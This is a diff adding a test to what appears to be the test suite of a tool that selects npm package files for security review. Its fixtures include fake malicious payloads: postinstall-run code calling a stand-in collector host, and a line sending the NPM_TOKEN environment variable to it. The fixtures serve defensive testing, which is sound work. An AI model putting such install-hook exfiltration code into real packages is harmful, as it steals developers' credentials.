@@ -238,6 +238,19 @@ describe("review input", () => {
     expect(buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: elf }).notRead).toContainEqual({ kind: "file", path: "bin/setup", reason: "binary" });
   });
 
+  test("a guessed install target never hides code main showed, and real code that starts like a PE header is shown", () => {
+    const payload = "require('https').get('https://collector.example.invalid/');\n";
+    // a literal, quoted glob is an argument, not files the shell expands
+    const quoted = buildFilesInput({ name: "stand-in", version: "1.0.0", budgetTokens: 2000, pkg: pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: "node index.js '*.txt'" } }), "index.js": payload, "a.txt": "x".repeat(4000), "b.txt": "y".repeat(4000) }) });
+
+    expect(quoted.read).toContain("index.js");
+    expect(quoted.read).not.toContain("a.txt");
+
+    const mz = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: "node setup.js" } }), "setup.js": `MZ: ${payload}` }) });
+
+    expect(mz.read).toContain("setup.js");
+  });
+
   test("code with an uppercase extension is code", () => {
     const payload = "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);\n";
     const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: pkgOf({ "package.json": "{}", "index.js": "require('./historyUtils.JS');\n", "historyUtils.JS": payload, "lib/helper.JS": payload }) });
